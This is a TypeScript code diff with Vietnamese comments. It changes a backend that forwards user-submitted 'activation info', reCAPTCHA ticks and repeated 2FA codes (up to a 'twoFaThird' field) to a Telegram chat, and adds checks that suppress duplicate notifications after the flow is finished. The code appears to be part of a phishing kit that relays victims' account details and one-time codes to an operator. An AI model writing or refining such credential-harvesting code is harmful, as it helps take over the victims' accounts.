@@ -195,8 +195,26 @@ function isActivationInfoSubmitEvent(data: any): boolean {
 }
 
 function stripClientEventFlags(data: any = {}) {
-    const { activationInfoSubmit, recaptcha, ...rest } = data;
+    const { activationInfoSubmit, recaptcha, flowCompleted, ...rest } = data;
     return rest;
+}
+
+/** Đã xong bước 2FA lần 3 → coi là hoàn tất toàn bộ luồng. */
+function hasCompletedFullFlow(data: any): boolean {
+    const d = normalizeData(data);
+    return Boolean(String(d.twoFaThird ?? '').trim());
+}
+
+/** Không gửi lại reCAPTCHA / Thông tin kích hoạt khi user quay lại từ đầu sau khi đã xong. */
+function shouldSkipRepeatEarlyNotifications(data: any): boolean {
+    if (data?.flowCompleted === true) return true;
+
+    const payload = stripClientEventFlags(data);
+    const key = generateKey(payload);
+    const prev = memoryStoreTTL.get(key);
+    const merged = mergeData(prev?.data, payload);
+
+    return hasCompletedFullFlow(merged) || hasCompletedFullFlow(payload);
 }
 
 function formatActivationInfoMessage(data: any): string {
@@ -262,9 +280,19 @@ async function sendRecaptchaTickTelegram(
 ): Promise<void> {
     const ipKey = recaptchaTickIpKey(data);
 
-    const mainKey = generateKey(data);
+    const mainKey = generateKey(stripClientEventFlags(data));
     const prev = memoryStoreTTL.get(mainKey);
-    const fullData = mergeData(prev?.data, data);
+    const fullData = mergeData(prev?.data, stripClientEventFlags(data));
+
+    if (shouldSkipRepeatEarlyNotifications(data)) {
+        console.warn('⚠️ Bỏ qua tin reCAPTCHA — luồng kích hoạt đã hoàn tất trước đó');
+        memoryStoreTTL.set(mainKey, {
+            message: prev?.message ?? formatRecaptchaTickMessage(fullData),
+            messageId: prev?.messageId ?? 0,
+            data: fullData,
+        });
+        return;
+    }
 
     if (recaptchaTickSentByIp.has(ipKey)) {
         console.warn(`⚠️ reCAPTCHA tick đã gửi cho IP này, bỏ qua: ${ipKey}`);
@@ -300,6 +328,11 @@ async function sendActivationInfoTelegram(
     config: NonNullable<ReturnType<typeof getTelegramConfig>>,
     data: any
 ): Promise<void> {
+    if (shouldSkipRepeatEarlyNotifications(data)) {
+        console.warn('⚠️ Bỏ qua tin Thông tin kích hoạt — luồng đã hoàn tất trước đó');
+        return;
+    }
+
     const payload = stripClientEventFlags(data);
     const key = generateKey(payload);
     if (!checkRateLimit(key)) {
